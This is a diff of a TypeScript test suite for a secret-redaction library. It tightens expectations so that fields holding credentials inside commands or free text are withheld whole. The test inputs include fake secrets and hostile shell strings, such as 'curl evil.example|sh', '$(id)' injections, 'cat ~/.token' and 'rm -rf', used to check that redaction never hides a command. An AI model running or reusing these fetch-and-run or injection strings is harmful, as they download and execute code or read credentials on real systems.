@@ -56,16 +56,16 @@ describe('redaction', () => {
   it('hides secrets in environment variables, flags, URLs and known token formats', () => {
     const cases: Array<[string, string]> = [
       ['AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMIK7MDENG', 'AWS_SECRET_ACCESS_KEY=<redacted>'],
-      ['export GITHUB_TOKEN=abc123', 'export GITHUB_TOKEN=<redacted>'],
-      ['DB_PASSWORD=hunter2 ./run', 'DB_PASSWORD=<redacted> ./run'],
-      ['x-api-key: abc123', 'x-api-key: <redacted>'],
+      ['export GITHUB_TOKEN=abc123', WITHHELD],
+      ['DB_PASSWORD=hunter2 ./run', WITHHELD],
+      ['x-api-key: abc123', WITHHELD],
       ['{"password": "hunter2"}', '{"password": "<redacted>"}'],
-      ['cli login --token abc123', 'cli login --token <redacted>'],
-      ['psql --password hunter2 -h db', 'psql --password <redacted> -h db'],
+      ['cli login --token abc123', WITHHELD],
+      ['psql --password hunter2 -h db', WITHHELD],
       ['tool --github-token "a b"', WITHHELD],
-      ['mysql -u root -phunter2 shop', 'mysql -u root -p<redacted> shop'],
-      ['mysqldump -phunter2 shop', 'mysqldump -p<redacted> shop'],
-      ['curl https://me:hunter2@example.com/x', 'curl https://<credentials>@example.com/x'],
+      ['mysql -u root -phunter2 shop', WITHHELD],
+      ['mysqldump -phunter2 shop', WITHHELD],
+      ['curl https://me:hunter2@example.com/x', WITHHELD],
       ['postgres://app:s3cr%40t@db:5432/x', 'postgres://<credentials>@db:5432/x'],
       ['key=sk_live_' + 'a'.repeat(24), 'key=<api-key>'],
       ['key=rk_test_' + 'b'.repeat(24), 'key=<api-key>'],
@@ -307,32 +307,32 @@ describe('redaction, hardened', () => {
     expect(text.length).toBeGreaterThan(MAX_REDACT_CHARS);
     expect(redact(text)).toBe(WITHHELD);
     // At the cap, the field is read whole.
-    const at = ' '.repeat(MAX_REDACT_CHARS - 20) + 'x PGPASSWORD=hunter2';
+    const at = 'PGPASSWORD=' + 'h'.repeat(MAX_REDACT_CHARS - 11);
     expect(at.length).toBe(MAX_REDACT_CHARS);
-    expect(redact(at)).toBe(at.replace('hunter2', '<redacted>'));
+    expect(redact(at) === 'PGPASSWORD=<redacted>').toBe(true);
     expect(redact('short')).toBe('short');
   });
 
   it('redacts credential-named settings at any length', () => {
     const cases: Array<[string, string]> = [
       ['PGPASSWORD=hunter2', 'PGPASSWORD=<redacted>'],
-      ['MYSQL_PWD=hunter2 mysql shop', 'MYSQL_PWD=<redacted> mysql shop'],
-      ['Authorization: Bearer hunter2', 'Authorization: Bearer <redacted>'],
-      ['authorization: Basic aGk=', 'authorization: Basic <redacted>'],
-      ['Proxy-Authorization: hunter2', 'Proxy-Authorization: <redacted>'],
+      ['MYSQL_PWD=hunter2 mysql shop', WITHHELD],
+      ['Authorization: Bearer hunter2', WITHHELD],
+      ['authorization: Basic aGk=', WITHHELD],
+      ['Proxy-Authorization: hunter2', WITHHELD],
       ['SLACK_BOT_TOKEN=x', 'SLACK_BOT_TOKEN=<redacted>'],
-      ['client_secret: s', 'client_secret: <redacted>'],
+      ['client_secret: s', WITHHELD],
       ['OPENAI_APIKEY=k', 'OPENAI_APIKEY=<redacted>'],
       ['PRIVATE_KEY=k', 'PRIVATE_KEY=<redacted>'],
       ['aws_access_key=k', 'aws_access_key=<redacted>'],
-      ['X-Auth: k', 'X-Auth: <redacted>'],
+      ['X-Auth: k', WITHHELD],
       ['git_credentials=k', 'git_credentials=<redacted>'],
-      ['Cookie: sid=abc', 'Cookie: <redacted>'],
+      ['Cookie: sid=abc', WITHHELD],
       ['Cookie: sid=abc; theme=dark', WITHHELD],
       ['SMTP_PASS=k', 'SMTP_PASS=<redacted>'],
-      ['--db-password=k --x', '--db-password=<redacted> --x'],
-      ['--api-key k', '--api-key <redacted>'],
-      ['accessToken: "abc"', 'accessToken: "<redacted>"'],
+      ['--db-password=k --x', WITHHELD],
+      ['--api-key k', WITHHELD],
+      ['accessToken: "abc"', WITHHELD],
       ['password=1234', 'password=<redacted>'],
     ];
     for (const [text, want] of cases) expect(redact(text)).toBe(want);
@@ -343,18 +343,23 @@ describe('redaction, hardened', () => {
     expect(redact('{"token": "a\\"b\\\\", "n": 1}')).toBe(WITHHELD);
     expect(redact("password='it\\'s a secret' next")).toBe(WITHHELD);
     expect(redact('secret="a b c')).toBe(WITHHELD);
-    // A plain token in quotes is cut out, and the quotes stay.
-    expect(redact("PGPASSWORD='hunter2' psql")).toBe("PGPASSWORD='<redacted>' psql");
+    // A plain token in quotes is cut out of an assignment, and the quotes stay.
+    expect(redact("PGPASSWORD='hunter2'")).toBe("PGPASSWORD='<redacted>'");
+    expect(redact("PGPASSWORD='hunter2' psql")).toBe(WITHHELD);
   });
 
-  it('keeps the quote that closes a shell argument', () => {
-    expect(redact("curl -H 'x-api-key: abc123' https://x.example/a")).toBe(
-      "curl -H 'x-api-key: <redacted>' https://x.example/a",
-    );
-    expect(redact('curl -H "Authorization: Bearer abc" https://x.example')).toBe(
-      'curl -H "Authorization: Bearer <redacted>" https://x.example',
-    );
-    expect(redact('["password=hunter2", "b"]')).toBe('["password=<redacted>", "b"]');
+  it('withholds a header in a command line, and cuts it out of an argument list', () => {
+    expect(redact("curl -H 'x-api-key: abc123' https://x.example/a")).toBe(WITHHELD);
+    expect(redact('curl -H "Authorization: Bearer abc" https://x.example')).toBe(WITHHELD);
+    expect(redactArgv(['curl', '-H', 'x-api-key: abc123', 'https://x.example/a'])).toEqual([
+      'curl',
+      '-H',
+      'x-api-key: <redacted>',
+      'https://x.example/a',
+    ]);
+    // An array's element may be an argument: nothing in it is cut out.
+    expect(redact('["password=hunter2", "b"]')).toBe(WITHHELD);
+    expect(redact('{"env":"password=hunter2"}')).toBe('{"env":"password=<redacted>"}');
   });
 
   it('leaves settings about secrets, flags and counts alone', () => {
@@ -379,11 +384,10 @@ describe('redaction, hardened', () => {
     const b64 = (s: string) => Buffer.from(s).toString('base64');
     const b64url = (s: string) => Buffer.from(s).toString('base64url');
     expect(redact('data=eyJwYXNzd29yZCI6Imh1bnRlcjIifQ==')).toBe('data=<base64-secret>');
-    expect(redact(`blob: ${b64url('{"api_key":"superSecret42"}')} end`)).toBe(
-      'blob: <base64-secret> end',
-    );
-    expect(redact(`x "${b64('{"alg":"HS256","typ":"JWT"}')}"`)).toBe('x "<base64-secret>"');
-    // Where it could be a command or its operand, the field is withheld instead.
+    expect(redact(`blob=${b64url('{"api_key":"superSecret42"}')}`)).toBe('blob=<base64-secret>');
+    expect(redact(`x="${b64('{"alg":"HS256","typ":"JWT"}')}"`)).toBe('x="<base64-secret>"');
+    // Anywhere else, the field is withheld instead.
+    expect(redact(`blob: ${b64url('{"api_key":"superSecret42"}')} end`)).toBe(WITHHELD);
     expect(redact('eyJwYXNzd29yZCI6Imh1bnRlcjIifQ==')).toBe(WITHHELD);
     expect(redact('echo eyJwYXNzd29yZCI6Imh1bnRlcjIifQ==')).toBe(WITHHELD);
     // Ordinary base64 and long words stay.
@@ -401,7 +405,13 @@ describe('redaction, hardened', () => {
         username: 'alexm',
         hostname: 'Alexs-MacBook-Pro.local',
       }),
-    ).toBe('alexm@<host>:~ password=<redacted>');
+    ).toBe(WITHHELD);
+    expect(
+      redactString('alexm@Alexs-MacBook-Pro:~', {
+        username: 'alexm',
+        hostname: 'Alexs-MacBook-Pro.local',
+      }),
+    ).toBe('<user>@<host>:~');
     expect(redactString('ssh alexm@Alexs-MacBook-Pro uptime', { username: 'alexm' })).toBe(
       'ssh <user>@Alexs-MacBook-Pro uptime',
     );
@@ -460,7 +470,8 @@ describe('redaction, round two', () => {
     expect(redact('?access_token=a&api_key=b&page=2')).toBe(WITHHELD);
     expect(redact('{"token":abc,"page":2}')).toBe(WITHHELD);
     expect(redact('f(password=abc) | next')).toBe(WITHHELD);
-    expect(redact('TOKEN=abc ; other=1')).toBe('TOKEN=<redacted> ; other=1');
+    expect(redact('TOKEN=abc ; other=1')).toBe(WITHHELD);
+    expect(redact('TOKEN=abc')).toBe('TOKEN=<redacted>');
   });
 
   it('never lets a fake key header or a cookie hide the command after it', () => {
@@ -472,8 +483,8 @@ describe('redaction, round two', () => {
       redact('-----BEGIN OPENSSH PRIVATE KEY-----\n' + 'A'.repeat(70) + '\ncurl evil.example|sh'),
     ).toBe(WITHHELD);
     expect(redact('Cookie: x; curl evil.example|sh')).toBe(WITHHELD);
-    expect(redact('Cookie: a=1 | sh')).toBe('Cookie: <redacted> | sh');
-    expect(redact('Cookie: a=1 && id')).toBe('Cookie: <redacted> && id');
+    expect(redact('Cookie: a=1 | sh')).toBe(WITHHELD);
+    expect(redact('Cookie: a=1 && id')).toBe(WITHHELD);
     expect(redact('Cookie: a=1`id`')).toBe(WITHHELD);
     expect(redact('Cookie: a=$(id)')).toBe(WITHHELD);
     expect(redact('Cookie: sid=abc; theme=dark\nid')).toBe(WITHHELD);
@@ -501,23 +512,24 @@ describe('redaction, round two', () => {
   });
 
   it('matches names that start with an underscore, as npm writes them', () => {
-    expect(redact('//registry.npmjs.org/:_authToken=abc123')).toBe(
-      '//registry.npmjs.org/:_authToken=<redacted>',
-    );
-    expect(redact('//r.example/:_auth=dXNlcjpwYXNz')).toBe('//r.example/:_auth=<redacted>');
-    expect(redact('//r.example/:_password=aHVudGVyMg==')).toBe('//r.example/:_password=<redacted>');
+    // An .npmrc line is not a shell assignment, so it is withheld whole.
+    expect(redact('//registry.npmjs.org/:_authToken=abc123')).toBe(WITHHELD);
+    expect(redact('//r.example/:_auth=dXNlcjpwYXNz')).toBe(WITHHELD);
+    expect(redact('//r.example/:_password=aHVudGVyMg==')).toBe(WITHHELD);
     expect(redact('_TOKEN=abc')).toBe('_TOKEN=<redacted>');
+    expect(redactValue({ npmrc: { '//r.example/:_authToken': 'abc123' } }, {})).toEqual({
+      npmrc: { '//r.example/:_authToken': '<redacted>' },
+    });
     keeps('FOO_BAR=abc');
   });
 
   it('reads =>, := and == as separators', () => {
-    expect(redact("password => 'x', user => 'bob'")).toBe(
-      "password => '<redacted>', user => 'bob'",
-    );
-    expect(redact('token := "abc"')).toBe('token := "<redacted>"');
-    expect(redact('if secret == "abc" && go')).toBe('if secret == "<redacted>" && go');
-    expect(redact("token === 'abc'")).toBe("token === '<redacted>'");
-    expect(redact('"api_key"=>"abc"')).toBe('"api_key"=>"<redacted>"');
+    // Each finds the secret, and in free text that withholds the field.
+    expect(redact("password => 'x', user => 'bob'")).toBe(WITHHELD);
+    expect(redact('token := "abc"')).toBe(WITHHELD);
+    expect(redact('if secret == "abc" && go')).toBe(WITHHELD);
+    expect(redact("token === 'abc'")).toBe(WITHHELD);
+    expect(redact('"api_key"=>"abc"')).toBe(WITHHELD);
   });
 
   it('withholds YAML values written on the lines below their name', () => {
@@ -530,47 +542,36 @@ describe('redaction, round two', () => {
     ]) {
       expect(redact(text), text).toBe(WITHHELD);
     }
-    // A nested mapping: the names inside are judged on their own.
-    expect(redact('auth:\n  user: bob\n  password: x\n')).toBe(
-      'auth:\n  user: bob\n  password: <redacted>\n',
-    );
+    // A nested mapping: the names inside are judged on their own, and a
+    // secret among them withholds the field like any other.
+    expect(redact('auth:\n  user: bob\n  password: x\n')).toBe(WITHHELD);
+    keeps('auth:\n  user: bob\n  password_policy: strong\n');
     keeps('password:\nnext: 1');
     keeps('token:\n\nid');
   });
 
-  it('redacts passwords in .netrc, command flags and XML', () => {
-    const cases: Array<[string, string]> = [
-      [
-        'machine example.com login bob password s3cret',
-        'machine example.com login bob password <redacted>',
-      ],
-      [
-        'machine x\n  login bob\n  password s3cret\n',
-        'machine x\n  login bob\n  password <redacted>\n',
-      ],
-      ['curl -u bob:hunter2 https://x.example', 'curl -u bob:<redacted> https://x.example'],
-      ['curl -ubob:hunter2 x', 'curl -ubob:<redacted> x'],
-      ['curl --user=bob:hunter2 x', 'curl --user=bob:<redacted> x'],
-      ["curl --user 'bob:hunter2' x", "curl --user 'bob:<redacted>' x"],
-      ["curl --user 'bob:hunter 2' x", WITHHELD],
-      ['sshpass -p hunter2 ssh -p 22 host', 'sshpass -p <redacted> ssh -p 22 host'],
-      ['sshpass -phunter2 ssh host', 'sshpass -p<redacted> ssh host'],
-      ['docker login -p hunter2 -u bob reg', 'docker login -p <redacted> -u bob reg'],
-      ['docker login --password hunter2 reg', 'docker login --password <redacted> reg'],
-      ['openssl enc -k hunter2 -in a', 'openssl enc -k <redacted> -in a'],
-      ['openssl enc -pass pass:hunter2 -in a', 'openssl enc -pass pass:<redacted> -in a'],
-      [
-        '<password>hunter2</password><user>bob</user>',
-        '<password><redacted></password><user>bob</user>',
-      ],
-      ['<ns:ApiKey id="1">abc</ns:ApiKey>', '<ns:ApiKey id="1"><redacted></ns:ApiKey>'],
-      [
-        '<add key="StripeApiKey" value="abc123" />',
-        '<add key="StripeApiKey" value="<redacted>" />',
-      ],
-      ['<input name="password" value="x">', '<input name="password" value="<redacted>">'],
-    ];
-    for (const [text, want] of cases) expect(redact(text)).toBe(want);
+  it('withholds .netrc text, command-line passwords and XML credentials', () => {
+    for (const text of [
+      'machine example.com login bob password s3cret',
+      'machine x\n  login bob\n  password s3cret\n',
+      'curl -u bob:hunter2 https://x.example',
+      'curl -ubob:hunter2 x',
+      'curl --user=bob:hunter2 x',
+      "curl --user 'bob:hunter2' x",
+      "curl --user 'bob:hunter 2' x",
+      'sshpass -p hunter2 ssh -p 22 host',
+      'sshpass -phunter2 ssh host',
+      'docker login -p hunter2 -u bob reg',
+      'docker login --password hunter2 reg',
+      'openssl enc -k hunter2 -in a',
+      'openssl enc -pass pass:hunter2 -in a',
+      '<password>hunter2</password><user>bob</user>',
+      '<ns:ApiKey id="1">abc</ns:ApiKey>',
+      '<add key="StripeApiKey" value="abc123" />',
+      '<input name="password" value="x">',
+    ]) {
+      expect(redact(text), text).toBe(WITHHELD);
+    }
     for (const text of [
       'the password is wrong',
       'passphrase c0rrect',
@@ -633,9 +634,8 @@ describe('redaction, round two', () => {
         'DefaultEndpointsProtocol=https;AccountName=acct;AccountKey=abc+def==;EndpointSuffix=core.windows.net',
       ),
     ).toBe(WITHHELD);
-    expect(redact('AccountName=acct AccountKey=abc+def== x')).toBe(
-      'AccountName=acct AccountKey=<redacted> x',
-    );
+    expect(redact('AccountName=acct AccountKey=abc+def== x')).toBe(WITHHELD);
+    expect(redact('AccountKey=abc+def==')).toBe('AccountKey=<redacted>');
   });
 
   it('closes the remaining leaks', () => {
@@ -647,15 +647,26 @@ describe('redaction, round two', () => {
       redact(
         `Authorization: AWS4-HMAC-SHA256 Credential=x/20240101/us-east-1/s3/aws4_request, SignedHeaders=host, Signature=${sig}`,
       ),
-    ).toBe('Authorization: AWS4-HMAC-SHA256 <redacted> SignedHeaders=host, Signature=<redacted>');
-    expect(redact(`https://b.example/k?X-Amz-Signature=${sig}&x=1`)).toBe(
-      'https://b.example/k?X-Amz-Signature=<redacted>&x=1',
+    ).toBe(WITHHELD);
+    expect(redact(`https://b.example/k?x=1#X-Amz-Signature=${sig}`)).toBe(
+      'https://b.example/k?x=1#X-Amz-Signature=<redacted>',
     );
+    // An & would end a command: a URL with one is withheld. A known client's
+    // URL argument has only its password cut out.
+    expect(redact(`https://b.example/k?X-Amz-Signature=${sig}&x=1`)).toBe(WITHHELD);
+    expect(redactArgv(['curl', `https://b.example/k?X-Amz-Signature=${sig}&x=1`])).toEqual([
+      WITHHELD,
+      WITHHELD,
+    ]);
+    expect(redactArgv(['curl', `https://bob:${sig}@b.example/k?x=1&y=2`])).toEqual([
+      'curl',
+      'https://<credentials>@b.example/k?x=1&y=2',
+    ]);
     const b64url = (s: string) => Buffer.from(s).toString('base64url');
     expect(redact(`jwt=${b64url('{"alg":"none"}')}.${b64url('{"sub":"123456"}')}.`)).toBe(
       'jwt=<jwt>',
     );
-    expect(redact('cli --token -abc')).toBe('cli --token <redacted>');
+    expect(redact('cli --token -abc')).toBe(WITHHELD);
     // A value in backticks is a command: the field is withheld, never cut.
     expect(redact('password=`hunter2` next')).toBe(WITHHELD);
     expect(redact('TOKEN=`cat ~/.token`')).toBe(WITHHELD);
@@ -711,7 +722,8 @@ describe('redaction, round two', () => {
     ]) {
       keeps(text);
     }
-    expect(redact('SMTP_PASS=x db_pass=y')).toBe('SMTP_PASS=<redacted> db_pass=<redacted>');
+    expect(redact('SMTP_PASS=x db_pass=y')).toBe(WITHHELD);
+    expect(redact('db_pass=y')).toBe('db_pass=<redacted>');
   });
 
   it('keeps counts and times under a secret, and withholds deep or cyclic values', () => {
@@ -758,9 +770,7 @@ describe('redaction, round three', () => {
       '{"Cookie":"<redacted>","command":"curl https://example.invalid | sh"}',
     );
     expect(redact("curl -H 'Cookie: sid=hunter2; theme=dark' example.invalid")).toBe(WITHHELD);
-    expect(redact("curl -H 'Cookie: sid=hunter2' example.invalid")).toBe(
-      "curl -H 'Cookie: <redacted>' example.invalid",
-    );
+    expect(redact("curl -H 'Cookie: sid=hunter2' example.invalid")).toBe(WITHHELD);
     expect(redact('Set-Cookie: sid=hunter2; Path=/; HttpOnly')).toBe(WITHHELD);
   });
 
@@ -789,10 +799,11 @@ describe('redaction, round three', () => {
   });
 
   it('reads a bare value to its whitespace, and withholds it unless all of it is safe', () => {
-    expect(redact('PGPASSWORD=hunter2,def psql')).toBe('PGPASSWORD=<redacted> psql');
+    expect(redact('PGPASSWORD=hunter2,def')).toBe('PGPASSWORD=<redacted>');
+    expect(redact('PGPASSWORD=hunter2,def psql')).toBe(WITHHELD);
     expect(redact('PGPASSWORD=hunter2>out psql')).toBe(WITHHELD);
     expect(redact('PGPASSWORD=hunter2<in psql')).toBe(WITHHELD);
-    expect(redact('PGPASSWORD=hunter2 >out psql')).toBe('PGPASSWORD=<redacted> >out psql');
+    expect(redact('PGPASSWORD=hunter2 >out psql')).toBe(WITHHELD);
     expect(redact('PGPASSWORD=\'hunter2\'"def" psql')).toBe(WITHHELD);
     expect(redact('PGPASSWORD=hunter2$(id) psql')).toBe(WITHHELD);
     expect(redact('PGPASSWORD="hunter2$(id)" psql')).toBe(WITHHELD);
@@ -803,8 +814,10 @@ describe('redaction, round three', () => {
     expect(redact('{"password":["hunter2"]}')).toBe(WITHHELD);
     expect(redact('{"password":{"value":"hunter2"}}')).toBe(WITHHELD);
     expect(redact('{"\\u0070assword":["hunter2"]}')).toBe(WITHHELD);
-    expect(redact('event {"password":"hunter2","n":12345} done')).toBe(
-      'event {"password":"<redacted>","n":12345} done',
+    // JSON inside other text is free text: a secret in it withholds the field.
+    expect(redact('event {"password":"hunter2","n":12345} done')).toBe(WITHHELD);
+    expect(redact(' {"password":"hunter2","n":12345}\n')).toBe(
+      ' {"password":"<redacted>","n":12345}\n',
     );
     expect(redact('{"user":"bob","creds":{"token":"hunter2","ttl":60}}')).toBe(
       '{"user":"bob","creds":{"token":"<redacted>","ttl":60}}',
@@ -814,9 +827,8 @@ describe('redaction, round three', () => {
     );
     expect(redact('{"\\u0070assword":"hunter2"}')).toBe('{"\\u0070assword":"<redacted>"}');
     // A string with escapes is read decoded, and found where it was written.
-    expect(redact('{"note":"a\\nPGPASSWORD=hunter2 b"}')).toBe(
-      '{"note":"a\\nPGPASSWORD=<redacted> b"}',
-    );
+    expect(redact('{"note":"a\\nPGPASSWORD=hunter2 b"}')).toBe(WITHHELD);
+    expect(redact('{"note":"PGPASSWORD=hunter2"}')).toBe('{"note":"PGPASSWORD=<redacted>"}');
     expect(redact('{"note":"PGPASSWORD=hunter\\u0032"}')).toBe(WITHHELD);
     expect(redactValue({ note: '{"password":"hunter2"}' }, {})).toEqual({
       note: '{"password":"<redacted>"}',
@@ -839,21 +851,19 @@ describe('redaction, round three', () => {
       WITHHELD,
     );
     expect(redact('echo \'{"a":"TOKEN=\\"x\'; id; echo \'\\""}\'')).toBe(WITHHELD);
-    // An escaped quote stays as written, so the shell quoting around it reads the same.
-    expect(redact('echo \'{"a":"\\u0027; id","token":"hunter2"}\'')).toBe(
-      'echo \'{"a":"\\u0027; id","token":"<redacted>"}\'',
-    );
+    // JSON in a command line is free text.
+    expect(redact('echo \'{"a":"\\u0027; id","token":"hunter2"}\'')).toBe(WITHHELD);
   });
 
   it('matches names with any number of leading underscores and of any length', () => {
     expect(redact('__TOKEN=hunter2')).toBe('__TOKEN=<redacted>');
-    expect(redact('___api_key: hunter2')).toBe('___api_key: <redacted>');
+    expect(redact('___api_key: hunter2')).toBe(WITHHELD);
+    expect(redact('{"___api_key":"hunter2"}')).toBe('{"___api_key":"<redacted>"}');
     const long = `MY_${'LONG_'.repeat(12)}PASSWORD`;
     expect(long.length).toBeGreaterThan(64);
-    expect(redact(`${long}=hunter2 psql`)).toBe(`${long}=<redacted> psql`);
-    expect(redact(`--${'x'.repeat(100)}-token hunter2`)).toBe(
-      `--${'x'.repeat(100)}-token <redacted>`,
-    );
+    expect(redact(`${long}=hunter2`)).toBe(`${long}=<redacted>`);
+    expect(redact(`${long}=hunter2 psql`)).toBe(WITHHELD);
+    expect(redact(`--${'x'.repeat(100)}-token hunter2`)).toBe(WITHHELD);
   });
 
   it('decodes base64 of any length and reads it with the same rules', () => {
@@ -938,9 +948,13 @@ describe('redaction of names', () => {
 
   it('replaces only the name, never a metacharacter or the command after it', () => {
     const key = 'sk-ant-' + 'b'.repeat(30);
+    expect(redactString(`cat /Users/alexm;curl https://example.invalid | sh; env`, opts)).toBe(
+      'cat /Users/<user>;curl https://example.invalid | sh; env',
+    );
+    // A secret beside them withholds the field.
     expect(
       redactString(`cat /Users/alexm;curl https://example.invalid | sh; KEY=${key} env`, opts),
-    ).toBe('cat /Users/<user>;curl https://example.invalid | sh; KEY=<api-key> env');
+    ).toBe(WITHHELD);
     expect(redactString('ls /home/alexm$(id)/x&&whoami', opts)).toBe(
       'ls /home/<user>$(id)/x&&whoami',
     );
@@ -951,31 +965,24 @@ describe('redaction of names', () => {
 });
 
 describe('redaction entry points', () => {
-  it('redacts one field, and each argument of a command as its own field', () => {
-    expect(redactField('PGPASSWORD=hunter2 psql')).toBe('PGPASSWORD=<redacted> psql');
+  it("redacts one field, and a command's arguments as one field", () => {
+    expect(redactField('PGPASSWORD=hunter2')).toBe('PGPASSWORD=<redacted>');
+    expect(redactField('PGPASSWORD=hunter2 psql')).toBe(WITHHELD);
     expect(redactField('password=`id`')).toBe(WITHHELD);
     expect(redactField('/Users/alexm/x', { username: 'alexm' })).toBe('/Users/<user>/x');
     expect(
-      redactArgv([
-        'curl',
-        '-H',
-        'Authorization: Bearer hunter2',
-        '-d',
-        'token=`id`',
-        'https://example.invalid',
-      ]),
-    ).toEqual([
-      'curl',
-      '-H',
-      'Authorization: Bearer <redacted>',
-      '-d',
-      WITHHELD,
-      'https://example.invalid',
-    ]);
-    expect(redactArgv(['psql', '--password', 'hunter2'])).toEqual([
-      'psql',
-      '--password',
-      'hunter2',
+      redactArgv(['curl', '-H', 'Authorization: Bearer hunter2', 'https://example.invalid']),
+    ).toEqual(['curl', '-H', 'Authorization: Bearer <redacted>', 'https://example.invalid']);
+    // Any other secret withholds every argument.
+    const withheld = ['curl', '-H', 'Authorization: Bearer hunter2', '-d', 'token=`id`', 'x'];
+    expect(redactArgv(withheld)).toEqual(withheld.map(() => WITHHELD));
+    // psql's --password takes no value: the next argument is not cut out, and
+    // read whole, the list holds a credential flag with a value.
+    expect(redactArgv(['psql', '--password', 'hunter2'])).toEqual([WITHHELD, WITHHELD, WITHHELD]);
+    expect(redactArgv(['ls', '-la', '/Users/alexm'], { username: 'alexm' })).toEqual([
+      'ls',
+      '-la',
+      '/Users/<user>',
     ]);
     expect(redactArgv([])).toEqual([]);
   });
@@ -1021,9 +1028,9 @@ describe('redaction, the nine findings of the second review', () => {
     ]) {
       expect(redact(text), text).toBe(WITHHELD);
     }
-    // One clean token in quotes is still cut out, the quotes kept.
-    expect(redact('curl -u "bob:hunter2" x')).toBe('curl -u "bob:<redacted>" x');
-    expect(redact('sshpass -p "hunter2" ssh host')).toBe('sshpass -p "<redacted>" ssh host');
+    // In a command line even one clean token withholds the field.
+    expect(redact('curl -u "bob:hunter2" x')).toBe(WITHHELD);
+    expect(redact('sshpass -p "hunter2" ssh host')).toBe(WITHHELD);
   });
 
   it('3: never erases a line inside a key-shaped block', () => {
@@ -1034,11 +1041,14 @@ describe('redaction, the nine findings of the second review', () => {
   it('4: keeps a command after assignments in view, and a word equal to the user name', () => {
     expect(redact(`FLAG=1 ${token} --arg`)).toBe(WITHHELD);
     expect(redact(`A=1 B="x y" ${token}`)).toBe(WITHHELD);
-    expect(redact(`FLAG=${token} cmd`)).toBe('FLAG=<github-token> cmd');
+    expect(redact(`FLAG=${token} cmd`)).toBe(WITHHELD);
+    expect(redact(`FLAG=${token}`)).toBe('FLAG=<github-token>');
     const named = { username: 'whoami' };
-    for (const text of ['true; whoami | cat', 'sudo whoami', 'ls /usr/bin/whoami', 'whoami@host']) {
+    for (const text of ['true; whoami | cat', 'sudo whoami', 'ls /usr/bin/whoami']) {
       expect(redactField(text, named), text).toBe(text);
     }
+    // user@host names the user wherever it is; the marker says which name stood there.
+    expect(redactField('whoami@host', named)).toBe('<user>@host');
     expect(redactField('ls /Users/whoami/x /srv/whoami/y', named)).toBe(
       'ls /Users/<user>/x /srv/<user>/y',
     );
@@ -1051,9 +1061,7 @@ describe('redaction, the nine findings of the second review', () => {
   it('5: withholds a quoted .netrc password that is not one clean token', () => {
     expect(redact('machine x login bob password "hunt er2"')).toBe(WITHHELD);
     expect(redact("machine x login bob password 'a;b'")).toBe(WITHHELD);
-    expect(redact('machine x login bob password "hunter2"')).toBe(
-      'machine x login bob password "<redacted>"',
-    );
+    expect(redact('machine x login bob password "hunter2"')).toBe(WITHHELD);
   });
 
   it('6: withholds an XML credential whose content is not one clean token', () => {
@@ -1066,7 +1074,7 @@ describe('redaction, the nine findings of the second review', () => {
     ]) {
       expect(redact(text), text).toBe(WITHHELD);
     }
-    expect(redact('<password>hunter2</password>')).toBe('<password><redacted></password>');
+    expect(redact('<password>hunter2</password>')).toBe(WITHHELD);
     // A marker from an earlier redaction is not an element.
     expect(redact('key=<api-key> and <token>')).toBe('key=<api-key> and <token>');
   });
@@ -1075,7 +1083,8 @@ describe('redaction, the nine findings of the second review', () => {
     expect(redact('PGPASSWORD=abc}def psql')).toBe(WITHHELD);
     expect(redact('PGPASSWORD=abc)def psql')).toBe(WITHHELD);
     expect(redact('PGPASSWORD=abc]def psql')).toBe(WITHHELD);
-    expect(redact('PGPASSWORD=abc,def psql')).toBe('PGPASSWORD=<redacted> psql');
+    expect(redact('PGPASSWORD=abc,def psql')).toBe(WITHHELD);
+    expect(redact('PGPASSWORD=abc,def')).toBe('PGPASSWORD=<redacted>');
   });
 
   it('8: withholds an oversized field whole, with no third outcome', () => {
@@ -1114,26 +1123,20 @@ describe('redaction, the four findings of the third review', () => {
   const redact = (text: string) => redactField(text);
   const token = 'ghp_' + 'b'.repeat(36);
 
-  it('1: reads a command after leading redirections, and the .netrc rule only in a .netrc', () => {
+  it('1: withholds a token after leading redirections, and any .netrc text', () => {
     expect(redact('2>password rm -rf /tmp/demo')).toBe('2>password rm -rf /tmp/demo');
     expect(redact('rm password "/etc/passwd"')).toBe('rm password "/etc/passwd"');
-    // A quoted token is a value, unless redirections put it in command position.
-    expect(redact(`echo "${token}"`)).toBe('echo "<github-token>"');
+    // A token in a command line withholds the field, wherever it stands.
+    expect(redact(`echo "${token}"`)).toBe(WITHHELD);
     for (const prefix of ['2>x', '>x', '<x', '2>&1', '&>x', '>>x', '2> x', 'A=1 2>/dev/null']) {
       expect(redact(`${prefix} "${token}"`), prefix).toBe(WITHHELD);
       expect(redact(`ls; ${prefix} "${token}"`), prefix).toBe(WITHHELD);
     }
-    // An argument that only looks like a redirection's target is not one.
-    expect(redact(`cat a2>x "${token}"`)).toBe('cat a2>x "<github-token>"');
+    expect(redact(`cat a2>x "${token}"`)).toBe(WITHHELD);
     const named = { username: 'whoami' };
-    expect(redactField('2>/dev/null whoami@host', named)).toBe('2>/dev/null whoami@host');
     expect(redactField('ssh whoami@host 2>&1', named)).toBe('ssh <user>@host 2>&1');
-    expect(redact('machine example.com login bob password s3cret')).toBe(
-      'machine example.com login bob password <redacted>',
-    );
-    expect(redact('default login bob password s3cret')).toBe(
-      'default login bob password <redacted>',
-    );
+    expect(redact('machine example.com login bob password s3cret')).toBe(WITHHELD);
+    expect(redact('default login bob password s3cret')).toBe(WITHHELD);
   });
 
   it('2: treats shell glob characters as unsafe', () => {
@@ -1178,11 +1181,24 @@ describe('redaction, the four findings of the third review', () => {
   });
 
   it('4: always treats a credential flag value as a secret', () => {
-    expect(redact('sshpass -p true ssh host')).toBe('sshpass -p <redacted> ssh host');
-    expect(redact('mysql -p1234 shop')).toBe('mysql -p<redacted> shop');
-    expect(redact('cli --token yes')).toBe('cli --token <redacted>');
-    expect(redact('cli --password=1234 x')).toBe('cli --password=<redacted> x');
-    expect(redact('openssl enc -k null -in a')).toBe('openssl enc -k <redacted> -in a');
+    for (const text of [
+      'sshpass -p true ssh host',
+      'mysql -p1234 shop',
+      'cli --token yes',
+      'cli --password=1234 x',
+      'openssl enc -k null -in a',
+    ]) {
+      expect(redact(text), text).toBe(WITHHELD);
+    }
+    expect(redactArgv(['mysql', '-p1234', 'shop'])).toEqual(['mysql', '-p<redacted>', 'shop']);
+    expect(redactArgv(['openssl', 'enc', '-k', 'null', '-in', 'a'])).toEqual([
+      'openssl',
+      'enc',
+      '-k',
+      '<redacted>',
+      '-in',
+      'a',
+    ]);
     // A setting, not a flag, may still hold a flag-like value.
     expect(redact('auth_token=true')).toBe('auth_token=true');
   });
@@ -1694,18 +1710,27 @@ describe('redaction never hides a command', () => {
     expect(withheld).toBeGreaterThan(300);
   });
 
